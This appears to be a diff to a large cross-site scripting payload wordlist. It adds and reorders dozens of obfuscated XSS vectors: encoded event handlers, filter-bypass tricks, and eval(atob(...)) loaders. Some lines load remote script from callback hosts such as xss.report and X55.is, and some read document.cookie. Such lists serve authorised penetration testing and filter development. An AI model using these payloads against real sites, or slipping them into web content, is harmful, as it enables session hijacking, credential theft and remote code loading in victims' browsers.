@@ -1,8 +1,32 @@
+"%26%2339>alert(1)>%26%2339<Svg>
+XSS"<s><a+href=//%26lt;svg/o%26%2378;load=alert(1)%26gt;>
+1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
+<!--%26gt;<TextArea><!--><Script>/*/</TextArea>/*/alert(1)</Script>
+<<https:http://x55.is/onfocus=1?import(tagName):1… AutoFocus ContentEditable>>
+<Svg OnLoad= location=textContent>JavaS<a>cript:al<a>ert(<a>1)//
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<xss ontransitionend​="alert(document.domain)">
+<xss ontransitionstart​="alert(document.domain)">
+<xss ontransitionrun​="alert(document.domain)"> 
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<input%20type=hidden%20oncontentvisibilityautostatechange=alert()%20style=content-visibility:auto>
+</<K><Svg Onload=alert(1)>
+</<Kno XSS="><Svg Onload=alert(1)>
+<!<K><Svg Onload=alert(1)>
+<!<Kno XSS="><Svg Onload=alert(1)>
+<img src=x onerror=eval(atob('YWxlcnQoIlR3aXR0ZXI6QG1vbWlrYTIzMyIp'))>
+1%27//"</Script><Img/Src%0AOnError=alert(1)//
+"%3E%3CD3V%0DonMOUseovEr%09=%09["BadrHere"].find(confirm)%0Dx%3Ev3dm0s"
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+<Img/Src/OnError=alert(1)>
+<Img Src=OnXSS OnError=alert(1)>
+%22%20onmouseover=alert(document.domain)%20x=%22
+"><script>alert(hacked_by_sudo+document.cookie);</script>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA AAABCAIAAADj8JvFAAAAEElEQVRIDbXBAQEAAAABIP6Pz3/vD0E1BYAAAAAElFTkSuQmCC"  onerror="alert('Hacked_by_momika233')"> 
+%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(document.domain)%3C/scRipt%3E
 <<https:http://x55.is/onfocus=1?import(tagName):1 AutoFocus ContentEditable>>
 <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 '"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
-<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
 '"><script src=https://xss.report/c/department></script>
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/department\';document.body.appendChild(a)')
@@ -13,12 +37,10 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.re
 <script>$.getScript("//xss.report/c/department")</script>
 var a=document.createElement("script");a.src="https://xss.report/c/department";document.body.appendChild(a);
 <Svg OnLoad= location=`Java${/S/.source}cript:alert${"\50"}1)`>
-<Svg OnLoad= location=textContent>JavaS<a>cript:al<a>ert(<a>1)//
 <img src="X" onerror=top[8680439..toString(30)](1337)> 
 <script>top[8680439..toString(30)](1337)</script>
 <input type=hidden oncontentvisibilityautostatechange​=alert() style=content-visibility:auto>
 OnXSS=<Img/Src/OnError=alert(1)>
-<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 (1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
 <img src=x  oncontentvisibilityautostatechange="confirm(1)">
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
@@ -2841,10 +2863,6 @@ www.meteoprog.ua
 <svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
 <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
 <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
-</<K><Svg Onload=alert(1)>
-</<Kno XSS="><Svg Onload=alert(1)>
-<!<K><Svg Onload=alert(1)>
-<!<Kno XSS="><Svg Onload=alert(1)>
 <img//////src=x oNlY=1 oNerror=alert(document.cookie)(import(/https:\\http://X55.is/?1=18369/.sour69/.source))//>
 '/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=alert(1)/**/(import(/https:\\http://X55.is/?1=18369/.sour69/.source))//>
 1%27/prompt?.(1)/%27
